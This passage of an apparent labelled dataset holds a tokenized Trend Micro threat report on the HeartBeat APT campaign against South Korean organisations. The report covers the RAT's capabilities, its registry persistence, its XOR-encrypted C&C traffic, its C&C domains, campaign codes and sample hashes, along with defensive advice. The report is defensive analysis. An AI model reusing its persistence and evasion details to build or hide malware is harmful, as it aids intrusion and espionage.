"%System%\\SvcHost", ".", "dll"], ["Some", "these", "dropped", "", ".", "DLL", "files", "use", "fake", "file", "properties"], ["in", "order", "to", "not", "appear", "suspicious", ".", "The", "following", "is", "an"], ["example:"], ["\u2022", "List", "existing", "files", "and", "their", "creation", "date/time"], ["\u2022", "Upload", "file(s)"], ["\u2022", "Delete", "file(s)"], ["\u2022", "Get", "the", "file", "creation", "date/time", "of", "a", "specific", "file"], ["\u2022", "Open", "a", "remote", "command", "shell", "access"], ["\u2022", "Reboot", "the", "system"], ["These", "commands", "give", "the", "attackers", "complete", "control", "over"], ["their", "victims\u2019", "systems", ".", "Attackers", "also", "have", "the", "option", "to"], ["uninstall", "the", "RAT", "any", "time", "to", "cover", "their", "tracks", "and", "avoid"], ["being", "discovered", "."], ["Installation", "and", "Persistence"], ["The", "RAT", "installer", "is", "initially", "dropped", "and", "executed", "by", "the"], ["packaged", "file", "using", "any", "of", "the", "following", "file", "names:"], ["\u2022", "%System%\\msrt", ".", "exe"], ["\u2022", "%Program", "Files%\\Common", "Files\\AcroRd32", ".", "exe"], ["\u2022", "%Program", "Files%\\Common", "Files\\config", ".", "exe"], ["Figure", "5", ".", "A", ".", "DLL", "that", "uses", "fake", "file", "properties"], ["\u2022", "%Program", "Files%\\Common", "Files\\explorer", ".", "exe"], ["PAGE", "5", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["In", "some", "cases", ",", "the", "RAT", "installer", "drops", "2", "", ".", "DLL", "files", "where"], ["one", "of", "the", "", ".", "DLLs", "serves", "as", "a", "loader", "of", "the", "other", "", ".", "DLL", "file"], ["which", "contains", "the", "backdoor", "payload", "."], ["The", "", ".", "DLL", "component", "is", "then", "registered", "as", "a", "service"], ["through", "the", "following", "added", "registries:"], ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\"], ["Services\\{service", "name}"], ["Type", "=", "\u201c20\u201d"], ["Start", "=", "\u201c2\u201d"], ["ErrorControl", "=", "\u201c1\u201d"], ["ImagePath", "=", "\u201c%SystemRoot%\\System32\\svchost", ".", "exe"], ["-k", "netsvcs\u201d"], ["ObjectName", "=", "\u201cLocalSystem\u201d"], ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\"], ["Services\\{service", "name}\\Parameters"], ["ServiceDll", "=", "C:\\Program", "Files\\Windows", "NT\\htrn", "."], ["dll"], ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\"], ["Services\\{service", "name}\\Security"], ["Security", "=", "{values}"], ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\"], ["Services\\{service", "name}\\Enum"], ["0", "=", "\u201cRoot\\LEGACY_{service", "name}\\0000\u201d"], ["Count", "=", "\u201c1\u201d"], ["NextInstance", "=", "\u201c1\u201d"], ["*{service", "name}", "may", "be", "\u201c6to4\u201d", ",", "\u201cIas\u201d", "or"], ["\u201cIrmon\u201d", "."], ["C&C", "Communication"], ["Once", "the", "RAT\u2019s", "", ".", "DLL", "component", "has", "been", "injected", "to"], ["svchost", ".", "exe,", "the", "malware", "attempts", "to", "register", "itself", "to", "the"], ["C&C", "server", "by", "sending", "the", "following", "information", "from", "the"], ["affected", "system:"], ["\u2022", "Computer", "name"], ["\u2022", "Local", "IP", "address"], ["\u2022", "Service", "pack"], ["These", "data", "are", "sent", "along", "with", "a", "campaign", "code", "and", "the"], ["string", "\u201cqawsed\u201d", ".", "While", "the", "\u201cqawsed\u201d", "string", "is", "not", "present"], ["in", "earlier", "versions", "of", "their", "RAT", ",", "we", "suspect", "that", "the"], ["attackers", "only", "recently", "added", "this", "as", "a", "default", "campaign"], ["password", "."], ["The", "RAT\u2019s", "C&C", "communication", "is", "encrypted", "with", "XOR"], ["encryption", "using", "a", "single", "byte", "key", ",", "02H", ".", "Furthermore", ",", "the"], ["data", "being", "transferred", "and", "received", "by", "the", "RAT", "C&C", "are"], ["800H", "(2", ",", "048", "bytes)", "in", "size", "."], ["The", "service", "is", "then", "invoked", "once", "installed", ".", "This", "results"], ["in", "the", "", ".", "DLL", "being", "injected", "to", "svchost", ".", "exe", "process", ".", "This"], ["registry", "modification", "allows", "the", "RAT", "to", "execute", "upon", "every"], ["system", "startup", "."], ["After", "installation", "the", "RAT", "installer", "deletes", "itself", ",", "which"], ["leaves", "only", "the", "disguised", "", ".", "DLL", "and", "related", "registry", "entries"], ["on", "the", "affected", "system", "."], ["Note", "that", "the", "presence", "of", "any", "of", "the", "files", "or", "registries"], ["above", "may", "be", "an", "indication", "of", "a", "possible", "HeartBeat"], ["infection", "in", "a", "system", "."], ["Figure", "6", ".", "RAT\u2019s", "encryption", "algorithm", "before", "sending", "data", "to", "its"], ["C&C", "server"], ["PAGE", "6", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["Figure", "7", ".", "RAT\u2019s", "decryption", "code", "upon", "receiving", "data", "from", "the", "C&C", "server"], ["During", "the", "RAT\u2019s", "phone", "home", ",", "the", "following", "TCP", "traffic", "is", "observed", "on", "the", "network:"], ["When", "decrypted", ",", "the", "above", "traffic", "looks", "as", "follows:"], ["The", "majority", "of", "the", "RAT", "variants", "used", "port", "80", ".", "Recent"], ["variants", ",", "however", ",", "were", "observed", "to", "use", "port", "443", ".", "Other"], ["ports", "we", "have", "seen", "being", "utilized", "are", "port", "5600", "and", "port"], ["8080", "."], ["Earlier", "RAT", "variants", "did", "not", "use", "encryption", "on", "their", "C&C"], ["communication", ".", "Moreover", ",", "they", "only", "sent", "the", "computer"], ["name", "and", "campaign", "code", "during", "phone", "home", ".", "Below", "is", "a"], ["screenshot", "of", "the", "unencrypted", "C&C", "communication", "."], ["PAGE", "7", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["The", "C&C", "traffic", "size", "also", "varied", "in", "previous", "versions", ".", "Some"], ["early", "variants", "used", "traffic", "that", "are", "28H", "(40", "bytes)", "and"], ["1004H", "(4", ",", "100", "bytes)", "in", "size", "."], ["Additionally", ",", "the", "port", ",", "C&C", "address", ",", "campaign", "code", "and"], ["password", "are", "hardcoded", "in", "the", "RAT\u2019s", "malware", "body"], ["in", "plain", "text", ".", "In", "some", "RAT", "versions", ",", "however", ",", "they", "are"], ["encrypted", "and", "are", "decrypted", "only", "during", "run-time", ","], ["possibly", "to", "protect", "the", "RAT", "from", "static", "analysis", "by", "security"], ["researchers", "."], ["These", "variations", "in", "their", "RAT", "component", "indicate", "that", "it"], ["has", "since", "been", "undergoing", "development", "."], ["Command", "and", "Control"], ["HeartBeat", "Campaign", "Codes", "and", "Decoy"], ["Documents"], ["The", "campaign", "codes", "and", "decoy", "documents", "used", "by", "the"], ["HeartBeat", "attackers", "provided", "valuable", "insights", "on", "their"], ["campaigns", ".", "In", "fact", ",", "majority", "of", "their", "campaign", "codes"], ["included", "number", "combinations", "which", "represented", "the"], ["month", "and", "date", "in", "MMDD", "format", "when", "the", "attack", "attempt"], ["was", "executed", ".", "The", "rest", "of", "the", "campaign", "code", "string"], ["often", "describes", "the", "decoy", "document", "that", "was", "used", "in", "a"], ["specific", "campaign", ".", "For", "instance", ",", "a", "campaign", "code", "from"], ["October", "2011", "is", "\u201carmy-1022\u201d", "where", "attackers", "used", "a", "decoy"], ["document", "containing", "military-related", "information", "."], ["Campaign", "code"], ["The", "HeartBeat", "campaign\u2019s", "C&C", "domains", "appear", "to", "utilize"], ["a", "site", "redirection", "service", ".", "Their", "C&C", "sites", "redirect", "to", "IP"], ["addresses", "from", "ISPs", "in", "Armenia", ",", "USA", ",", "Japan", ",", "India", "and"], ["Korea", ".", "We", "observed", "that", "they", "updated", "the", "IP", "address"], ["of", "some", "of", "their", "C&C", "domains", ".", "Likewise", ",", "all", "of", "their", "IP"], ["addresses", "belong", "to", "legitimate", "ISPs", ".", "Considering", "this", ","], ["we", "suspect", "that", "these", "IP", "addresses", "are", "compromised"], ["hosts", "that", "act", "as", "proxy", "servers", "which", "redirects", "traffic", "to"], ["the", "actual", "C&C", "servers", ".", "Again", ",", "this", "adds", "another", "layer", "of"], ["anonymity", "to", "the", "HeartBeat", "perpetrators", "."], ["Domain"], ["IP", "Address"], ["ahnlab", ".", "myfw.us"], ["XXX", ".", "XXX.217.123", "/XXX", ".", "XX.121.84"], ["kissyou01", ".", "myfw.us"], ["XX", ".", "XXX.203.122", "/", "XX", ".", "XXX.20.103"], ["kita", ".", "myfw.us"], ["XXX", ".", "XXX.217.123", "/", "XXX", ".", "XX.121.84"], ["login", ".", "sbs.com.PassAs.us"], ["XXX", ".", "XXX.178.50"], ["mail2", ".", "myfw.us"], ["XX", ".", "XXX.15.63", "/", "XXX", ".", "XXX.198.93"], ["park007", ".", "myfw.us"], ["unknown"], ["snrp", ".", "UglyAs.com"], ["XXX", ".", "XXX.169.45"], ["www", ".", "banking.com.PassAs.us"], ["XXX", ".", "XXX.178.50"], ["www", ".", "huyang.go.kr.PassAs.us"], ["XXX", ".", "XXX.217.123", "/", "XX", ".", "XXX.136.115"], ["www", ".", "kinu.or.kr.rr.nu"], ["XXX", ".", "XXX.178.50"], ["www", ".", "kndu.ac.kr.myfw.us"], ["XXX", ".", "XXX.4.180"], ["young03", ".", "myfw.us"], ["XX", ".", "XXX.203.122"], ["Table", "1", ".", "List", "of", "HeartBeat", "C&Cs"], ["PAGE", "8", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["Password"], ["1119HWP"], ["None"], ["kris0315"], ["None"], ["PDF-0417"], ["None"], ["gh-0525"], ["None"], ["0909-jpg"], ["qawsed"], ["0916"], ["qawsed"], ["jpg-jf-0925"], ["qawsed"], ["army-1022"], ["qawsed"], ["1103-ghui"], ["qawsed"], ["1113-minzhu"], ["qawsed"], ["ajh7884@han"], ["qawsed"], ["001"], ["qawsed"], ["0305-ziyoudang"], ["qawsed"], ["0326-xuehui"], ["qawsed"], ["0328-junf"], ["qawsed"], ["0329-mnd"], ["qawsed"], ["1q2w3e4r"], ["None"], ["0520-tiegang"], ["qawsed"], ["guohui-0604"], ["qawsed"], ["Table", "2", ".", "Campaign", "codes", "used"], ["On", "the", "other", "hand", ",", "decoy", "documents\u2019", "contents", "were"], ["also", "very", "specific", "to", "their", "targets", ".", "For", "example", ",", "some", "of"], ["these", "documents", "included", "logos", "of", "specific", "groups", ".", "This"], ["information", "helped", "us", "identify", "their", "targeted", "organizations"], ["and", "communities", "in", "their", "previous", "campaigns", "."], ["PAGE", "9", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["Figure", "7", ".", "Relationships", "between", "HeartBeat", "attack", "components"], ["Relationships", "among", "C&C", "Domains", ",", "IPs", ",", "and", "Campaigns"], ["Attribution"], ["Clues", "relating", "to", "the", "attackers", "remain", "very", "limited", ".", "Using"], ["compromised", "hosts", "as", "C&C", "proxy", "servers", "minimizes", "the"], ["possibility", "of", "tracking", "potential", "threat", "actors", ".", "While", "a"], ["number", "of", "their", "campaign", "codes", "included", "Chinese", "words"], ["such", "as", "guohui", ",", "xuehui", "and", "minzhu", ",", "they", "appear", "to", "be"], ["comfortable", "using", "the", "English", "language", ".", "Some", "of", "the", "C&C"], ["domain", "names", "even", "contained", "English", "words", ".", "In", "addition", ","], ["the", "binder", "tool", "and", "the", "RAT", "component", "are", "written"], ["in", "English", ".", "For", "instance", ",", "some", "text", "from", "the", "packaged"], ["components\u2019", "body", "included", "\u201cSelect", "Files", "!", "\u201d", "and", "\u201cBind"], ["Success!\u201d", ",", "while", "the", "RAT", "component", "included", "strings"], ["such", "as", "\u201cUninstall\u2026ok\u201d", "and", "the", "name", "of", "the", "RAT", "itself", ","], ["\u201cHeartBeat", ".", "\u201d"], ["Threat", "actors", "and", "entities", "that", "use", "collected", "information"], ["from", "targets", "may", "be", "two", "separate", "parties", "that", "are", "only"], ["related", "in", "a", "professional", "and", "malicious", "manner", ".", "In", "this"], ["case", ",", "determining", "the", "latter", "may", "be", "impossible", ".", "Likewise", ","], ["it", "is", "very", "difficult", "to", "identify", "the", "threat", "actors", "behind"], ["the", "HeartBeat", "campaign", "given", "the", "limited", "amount", "of"], ["information", "available", "."], ["Conclusion"], ["The", "Heartbeat", "campaign", "has", "been", "successfully", "executing"], ["targeted", "attacks", "since", "2009", ".", "In", "order", "for", "attackers", "to"], ["properly", "track", "their", "campaigns", "and", "victims", ",", "they", "used"], ["campaign", "codes", "that", "contained", "the", "campaign", "dates", "and"], ["strings", "that", "described", "specific", "campaigns", ".", "These", "campaign"], ["codes", "are", "embedded", "in", "their", "RAT", "binaries", "and", "were", "sent"], ["to", "their", "C&C", "servers", "along", "with", "information", "regarding", "the"], ["targets\u2019", "system", ".", "Additionally", ",", "they", "used", "a", "commercial", "site"], ["redirection", "service", "for", "their", "C&C", "domains", ".", "These", "domains"], ["redirected", "to", "various", "IP", "addresses", "that", "belonged", "to"], ["legitimate", "ISPs", ",", "which", "may", "be", "compromised", "hosts", "that", "act"], ["as", "proxy", "servers", ".", "This", "effectively", "hides", "the", "real", "location", "of"], ["the", "attackers", "behind", "HeartBeat", ".", "While", "having", "an", "isolated"], ["target", "may", "have", "helped", "them", "stay", "under", "the", "security"], ["industry\u2019s", "radar", ",", "the", "attackers", "illustrated", "that", "they", "were"], ["very", "careful", "but", "persistent", "."], ["Understanding", "targeted", "campaigns", "and", "their"], ["methodologies", "is", "fundamental", "in", "protecting", "both", "end"], ["users", "and", "organizations", ".", "Not", "only", "does", "it", "help", "in", "coming"], ["up", "with", "effective", "defensive", "strategies", "through", "multiple"], ["protection", "layers", ",", "it", "also", "helps", "with", "predicting", "possible"], ["targets", "in", "the", "future", "and", "ultimately", ",", "raise", "awareness", ".", "As"], ["of", "this", "writing", ",", "the", "HeartBeat", "APT", "campaign", "remains", "an"], ["active", "targeted", "campaign", "."], ["Timeline"], ["We", "collected", "19", "set", "of", "samples", "related", "to", "HeartBeat"], ["campaign", "from", "November", "2009", "to", "June", "2012", ".", "This"], ["translates", "to", "19", "campaigns", "where", "the", "vast", "majority"], ["of", "which", "were", "distributed", "between", "2011", "and", "2012", "."], ["Nonetheless", ",", "the", "limited", "number", "of", "samples", "we", "were"], ["able", "to", "obtain", "still", "means", "that", "the", "campaign", "is", "indeed"], ["persistent", ".", "The", "isolated", "nature", "of", "this", "targeted", "attack"], ["and", "its", "small", "user", "base", "may", "only", "require", "the", "HeartBeat"], ["perpetrators", "to", "carry", "out", "minimal", "campaigns", "in", "order", "to"], ["infiltrate", "their", "targets", "."], ["Campaign"], ["Date"], ["(MM/DD/YY)"], ["MD5", "(", ".", "DLL", "component)"], ["Compile"], ["Date"], ["(MM/DD/YY)"], ["11/19/09"], ["7c6b44d8d87898e7e5deeeb1961b5ae6"], ["9/17/2009"], ["03/15/11"], ["fcf42cadb3a932989c8e2b29cef68861"], ["12/24/2010"], ["04/17/11"], ["aab129ffd3bf5ceeae2e0f332217bebc"], ["3/18/2011"], ["05/25/11"], ["86547d674e7c7da55e8cae359819832f"], ["5/6/2011"], ["09/09/111"], ["f947e63b14853a69b8ed2648869b5e10"], ["7/25/2011"], ["09/16/11"], ["7f1a633384ec97fae9d95d1df9e1135a"], ["7/25/2011"], ["09/25/11"], ["8816c5be1305488019769c81259dad2a"], ["9/21/2011"], ["10/22/11"], ["874025a66c2b9d9831c03d1bc114876a"], ["10/17/2011"], ["11/03/11"], ["4046dec1aa0eebb01fe7469184a95398"], ["10/31/2011"], ["11/13/11"], ["ba370b17dc9eb1d1e1c3187f0768064f"], ["10/31/2011"], ["12/2011"], ["51274cefb01cee981a09db83c984213d"], ["11/28/2011"], ["02/2012"], ["d1a2253361045f91ed1902e9ffe2cec3"], ["7/18/2011"], ["03/05/12"], ["20bb652e1d2679ed230102aa9676eca0"], ["3/1/2012"], ["03/26/12"], ["c5c0fea23138cddab96fe22b657f9132"], ["3/8/2012"], ["03/28/12"], ["ef2bc66ea69327d11d1859af26f5aef9"], ["3/8/2012"], ["03/29/12"], ["8e50af054d2c0b45c88082d53c4fc423"], ["3/8/2012"], ["04/2012"], ["b1e47ecd68c1c151866cec275716aa67"], ["4/18/2012"], ["05/20/12"], ["6d205e78fb7730066c116b0c2dffa398"], ["5/2/2012"], ["06/04/12"], ["5ec175512ba3c6e78597af48bbe6ca60"], ["5/2/2012"], ["Table", "3", ".", "Specific", "dates", "of", "HeartBeat", "campaigns"], ["PAGE", "10", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["We", "did", "not", "obtain", "a", "campaign", "sample", "from", "2010", ".", "However", ","], ["we", "highly", "suspect", "that", "their", "operation", "was", "also", "active"], ["during", "that", "year", ".", "In", "fact", ",", "we", "can", "see", "in", "the", "second", "MD5"], ["above", "that", "the", "sample", "was", "compiled", "in", "December", "24", ",", "2010", "."], ["Also", ",", "it", "is", "possible", "that", "some", "of", "the", "campaign\u2019s", "attacks"], ["may", "not", "have", "been", "escalated", "to", "antivirus", "firms", "by", "infected"], ["users", ",", "or", "simply", "remains", "undiscovered", "."], ["that", "contain", "file", "attachments", "using", "extensions", "such", "as"], ["", ".", "VBS,", "", ".", "BAT,", "", ".", "EXE,", "", ".", "PIF", "and", "", ".", "SCR", "files", "."], ["\u2022", "Avoid", "opening", "email", "attachments", "and", "clicking"], ["embedded", "links", "from", "unknown", "sources"], ["\u2022", "Block", "any", "file", "with", "more", "than", "one", "file", "type", "extension", "."], ["Defending", "against", "the", "HeartBeat"], ["Campaign"], ["\u2022", "When", "a", "computer", "is", "compromised", ",", "isolate", "it"], ["immediately", "from", "the", "network", "."], ["Essential", "components", "of", "defense", "against", "the", "HeartBeat"], ["campaign", "are", "security-related", "policies", "within", "enterprises", "."], ["Once", "an", "attack", "is", "identified", ",", "a", "good", "cleanup", "strategy"], ["should", "focus", "on", "determining", "the", "attack", "vector", "and", "cutting"], ["off", "communications", "with", "the", "C&C", "server", ".", "It", "is", "also", "vital", "to"], ["determine", "the", "scope", "of", "the", "compromise", "and", "assessing", "the"], ["damage", "through", "data", "analysis", "and", "forensics", "."], ["\u2022", "Don\u2019t", "save", "login", "credentials", "on", "the", "local", "computer", "."], ["\u2022", "Configure", "your", "system", "to", "show", "hidden", "files", "and", "folders"], ["and", "display", "file", "extensions", "."], ["The", "following", "best", "practices", "are", "also", "advised:"], ["\u2022", "Disable", "services", "that", "are", "related", "to", "the", "HeartBeat", "RAT"], ["component", "."], ["\u2022", "Enable", "system\u2019s", "firewall"], ["\u2022", "Keep", "software", "and", "operating", "systems", "updated"], ["with", "latest", "patches", "released", "by", "vendors", "to", "address"], ["vulnerabilities", "and", "exploits", "."], ["\u2022", "Block", "unused", "ports", "to", "disallow", "malware", "from"], ["using", "these", "ports", "to", "communicate", "and/or", "enforce"], ["commands", "."], ["\u2022", "Monitor", "network", "connections", "for", "any", "suspicious"], ["connection", "or", "connectivity", "."], ["\u2022", "Regularly", "update", "list", "of", "sites", "that", "are", "trusted", "."], ["\u2022", "Configure", "your", "email", "server", "to", "block", "or", "remove", "email"], ["PAGE", "11", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["Trend", "Micro", "Threat", "Protection", "Against", "The", "HeartBeat", "Campaign", "Components"], ["The", "following", "table", "summarizes", "the", "Trend", "Micro", "solutions", "for", "the", "components", "of", "the", "HeartBeat", "campaign", ".", "Trend", "Micro"], ["recommends", "a", "comprehensive", "security", "risk", "management", "strategy", "that", "goes", "further", "than", "advanced", "protection", "to", "meet"], ["the", "real-time", "threat", "management", "requirements", "of", "dealing", "with", "targeted", "attacks", "."], ["Attack", "Component"], ["Protection", "Technology"], ["Trend", "Micro", "Solution"], ["HeartBeat", "TCP", "communication", "is", "blocked", "in", "the"], ["network", "layer", "as", "TCP_HBEAT_REQUEST"], ["Web", "Reputation"], ["Endpoint", "(Titanium", ",", "Worry-Free", "Business"], ["Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging", "Security", ","], ["ScanMail", "Suite", "for", "Microsoft", "Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ",", "InterScan"], ["Messaging", "Security)"], ["Mobile", "(Mobile", "Security)"], ["TROJ_DRPBEAT", "and", "BKDR_HBEAT", "variants"], ["File", "Reputation"], ["(Antivirus/Anti-malware)"], ["Endpoint", "(Titanium", ",", "Worry-Free", "Business"], ["Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging", "Security", ","], ["ScanMail", "Suite", "for", "Microsoft", "Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ",", "InterScan"], ["Messaging", "Security)"], ["Mobile", "(Mobile", "Security)"], ["XXX", ".", "XXX.217.123"], ["XXX", ".", "XX.121.84"], ["XX", ".", "XXX.203.122"], ["XX", ".", "XXX.20.103"], ["XXX", ".", "XXX.217.123"], ["XXX", ".", "XX.121.84"], ["XXX", ".", "XXX.178.50"], ["XX", ".", "XXX.15.63"], ["XXX", ".", "XXX.198.93"], ["XXX", ".", "XXX.169.45"], ["XXX", ".", "XXX.178.50"], ["XXX", ".", "XXX.217.123"], ["XX", ".", "XXX.136.115"], ["XXX", ".", "XXX.178.50"], ["XXX", ".", "XXX.4.180"], ["XX", ".", "XXX.203.122"], ["ahnlab", ".", "myfw.us"], ["kissyou01", ".", "myfw.us"], ["kita", ".", "myfw.us"], ["login", ".", "sbs.com.PassAs.us"], ["mail2", ".", "myfw.us"], ["park007", ".", "myfw.us"], ["snrp", ".", "UglyAs.com"], ["www", ".", "banking.com.PassAs.us"], ["www", ".", "huyang.go.kr.PassAs.us"], ["www", ".", "kinu.or.kr.rr.nu"], ["www", ".", "kndu.ac.kr.myfw.us"], ["young03", ".", "myfw.us"], ["Web", ",", "Domain", ",", "and", "IP", "Reputation"], ["Endpoint", "(Titanium", ",", "Worry-Free", "Business"], ["Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging", "Security", ","], ["ScanMail", "Suite", "for", "Microsoft", "Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ",", "InterScan"], ["Messaging", "Security)"], ["Mobile", "(Mobile", "Security)"], ["PAGE", "12", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["December", "2012", "|", "APT", "Campaign", "Quick", "Profile:", "HEARTBEAT"], ["Advanced", "persistent", "threats", "(APTs)", "refer", "to", "a", "category", "of", "threats", "that", "aggressively", "pursue", "and", "compromise", "specific"], ["targets", "to", "maintain", "persistent", "presence", "within", "the", "victim\u2019s", "network", "so", "they", "can", "move", "laterally", "and", "exfiltrate", "data", "."], ["Unlike", "indiscriminate", "cybercrime", "attacks", ",", "spam", ",", "web", "threats", ",", "and", "the", "like", ",", "APTs", "are", "much", "harder", "to", "detect", "because"], ["of", "the", "targeted", "nature", "of", "related", "components", "and", "techniques", ".", "Also", ",", "while", "cybercrime", "focuses", "on", "stealing", "credit", "card"], ["and", "banking", "information", "to", "gain", "profit", ",", "APTs", "are", "better", "thought", "of", "as", "cyber", "espionage", "."], ["HEARTBEAT"], ["\u2022", "First", "Seen"], ["Individual", "targeted", "attacks", "are", "not", "one-off", "attempts", ".", "Attackers", "continually", "try", "to", "get", "inside", "the", "target\u2019s", "network", "."], ["The", "\u201cHeartBeat\u201d", "campaign", "has", "been", "persistently", "pursuing", "government", "agencies", "since", "2009", ".", "The", "samples", "collected", "related", "to", "this", "campaign", "covered"], ["attacks", "seen", "from", "November", "2009", "to", "June", "2012", ",", "although", "majority", "of", "the", "attacks", "were", "seen", "in", "2011", "and", "2012", "."], ["\u2022", "Victims", "and", "Targets"], ["APT", "campaigns", "target", "specific", "industries", "or", "communities", "of", "interest", "in", "specific", "regions", "."], ["The", "HeartBeat", "campaign", "targets", "South", "Korean", "government", "organizations", "and", "institutions", "like", "political", "parties", ",", "media", "outfits", ",", "a", "national", "policy"], ["research", "institute", ",", "a", "military", "branch", "of", "South", "Korean", "armed", "forces", ",", "a", "small", "business", "sector", "organization", ",", "and", "branches", "of", "the", "South", "Korean"], ["government", "."], ["\u2022", "Operations"], ["The", "1st-stage", "computer", "intrusions", "often", "use", "social", "engineering", ".", "Attackers", "custom-fit", "attacks", "to", "their", "targets", "."], ["The", "threat", "actors", "behind", "HeartBeat", "install", "a", "RAT", "in", "system", ".", "The", "RAT", "arrives", "as", "a", "disguised", "or", "fake", "document", "which", "is", "actually", "a", "bundled", "file", ".", "The"], ["bundled", "file", "contains", "both", "a", "decoy", "document", "and", "the", "RAT", "installer", "that", "has", "been", "packaged", "together", "using", "a", "binder", "tool", ".", "The", "campaign\u2019s", "decoy"], ["documents", "used", "the", "file", "formats", "", ".", "JPG,", "", ".", "PDF,", "XLS", ",", "and", "HWP", ",", "the", "Korean", "government", "standard", "word", "processor", "format", "."], ["\u2022", "Possible", "Indicators", "of", "Compromise"], ["Attackers", "want", "to", "remain", "undetected", "as", "long", "as", "possible", ".", "A", "key", "characteristic", "of", "these", "attacks", "is", "stealth", "."], ["The", "following", "indicators", "suggest", "an", "infection", "by", "the", "HeartBeat", "campaign:", "contiguous", "02H", "bytes", "communication", "in", "the", "network", ",", "the", "presence", "of"], ["certain", "files", "and", "registries", "as", "detailed", "in", "the", "paper", ",", "and", "network", "connections", "to", "certain", "IPs", "and", "domains", ",", "including", "the", "presence", "of", "files", "detected", "as"], ["TROJ_DRPBEAT", "and", "BKDR_HBEAT", "."], ["\u2022", "Relationship", "with", "other", "APT", "Campaigns"], ["This", "attack", "does", "not", "seem", "to", "have", "any", "relationship", "with", "other", "APT", "campaigns", "."], ["PAGE", "13", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["TREND", "MICRO", "INCORPORATED"], ["TREND", "MICRO", "INC", "."], ["Trend", "Micro", "Incorporated", "(TYO:", "4704;", "TSE:", "4704)", ",", "a", "global", "cloud", "security"], ["leader", ",", "creates", "a", "world", "safe", "for", "exchanging", "digital", "information", "with", "its", "Internet", "content", "security", "and", "threat", "management", "solutions", "for", "businesses"], ["and", "consumers", ".", "A", "pioneer", "in", "server", "security", "with", "over"], ["20", "years\u2019", "experience", ",", "we", "deliver", "top-ranked", "client", ",", "server", "and", "cloudbased", "security", "that", "fits", "our", "customers\u2019", "and", "partners\u2019", "needs", ",", "stops"], ["new", "threats", "faster", ",", "and", "protects", "data", "in", "physical", ",", "virtualized", "and", "cloud"], ["environments", ".", "Powered", "by", "the", "industry-leading", "Trend", "Micro\u2122", "Smart", "Protection", "Network\u2122", "cloud", "computing", "security", "infrastructure", ",", "our", "products"], ["and", "services", "stop", "threats", "where", "they", "emerge\u2014from", "the", "Internet", ".", "They", "are"], ["supported", "by", "1", ",", "000+", "threat", "intelligence", "experts", "around", "the", "globe", "."], ["10101", "N", ".", "De", "Anza", "Blvd", "."], ["Cupertino", ",", "CA", "95014"], ["U", ".", "S.", "toll", "free:", "1", "+800", ".", "228.5651"], ["Phone:", "1", "+408", ".", "257.1500"], ["Fax:", "1", "+408", ".", "257.2003"], ["www", ".", "trendmicro.com"], ["\u00a92012", "by", "Trend", "Micro", ",", "Incorporated", ".", "All", "rights", "reserved", ".", "Trend", "Micro", "and", "the", "Trend", "Micro", "t-ball", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Trend", "Micro", ",", "Incorporated", ".", "All", "other", "product", "or", "company"], ["names", "may", "be", "trademarks", "or", "registered", "trademarks", "of", "their", "owners", "."], ["PAGE", "14", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Email", "name": "jeno_1980@hotmailcom", "sent_id": 7, "pos": []}, {"old_id": "T2", "type": "Time", "name": "Between 2004 and 2011", "sent_id": 6, "pos": [20, 23]}, {"old_id": "T3", "type": "Person", "name": "Tawnya Grilth", "sent_id": 7, "pos": []}, {"old_id": "T4", "type": "Person", "name": "Eric Charles", "sent_id": 7, "pos": []}, {"old_id": "T5", "type": "Campaign", "name": "Advanced Persistent Threat", "sent_id": 12, "pos": [43, 45]}, {"old_id": "T6", "type": "MalwareFamily", "name": "Enfal", "sent_id": 14, "pos": []}, {"old_id": "T7", "type": "MalwareFamily", "name": "EtenFalcon", "sent_id": 14, "pos": []}, {"old_id": "T8", "type": "MalwareFamily", "name": "RegSubsDat", "sent_id": 21, "pos": []}, {"old_id": "T9", "type": "MalwareFamily", "name": "RegSubDat", "sent_id": 21, "pos": []}, {"old_id": "T10", "type": "MalwareFamily", "name": "Kirpich", "sent_id": 21, "pos": []}, {"old_id": "T11", "type": "Country", "name": "Vietnam", "sent_id": 29, "pos": [9]}, {"old_id": "T12", "type": "Country", "name": "Brunei", "sent_id": 29, "pos": [11]}, {"old_id": "T13", "type": "Country", "name": "Myanmar", "sent_id": 29, "pos": [14]}, {"old_id": "T14", "type": "Malware", "name": "RegSubsDat", "sent_id": 29, "pos": [18]}, {"old_id": "T15", "type": "Malware", "name": "RegSubsDat", "sent_id": 31, "pos": [16]}, {"old_id": "T16", "type": "Malware", "name": "Enfal", "sent_id": 31, "pos": [18]}, {"old_id": "T17", "type": "Region", "name": "Europe", "sent_id": 31, "pos": [8]}, {"old_id": "T18", "type": "Region", "name": "Middle East", "sent_id": 31, "pos": [11, 12]}, {"old_id": "T19", "type": "Country", "name": "China", "sent_id": 33, "pos": [11]}, {"old_id": "T20", "type": "Malware", "name": "GhostNet", "sent_id": 38, "pos": [4]}, {"old_id": "T21", "type": "Campaign", "name": "Sin Digoo", "sent_id": 38, "pos": [18, 19]}, {"old_id": "T22", "type": "Malware", "name": "Murcy", "sent_id": 39, "pos": []}, {"old_id": "T23", "type": "Time", "name": "2011", "sent_id": 38, "pos": [28]}, {"old_id": "T25", "type": "Address", "name": 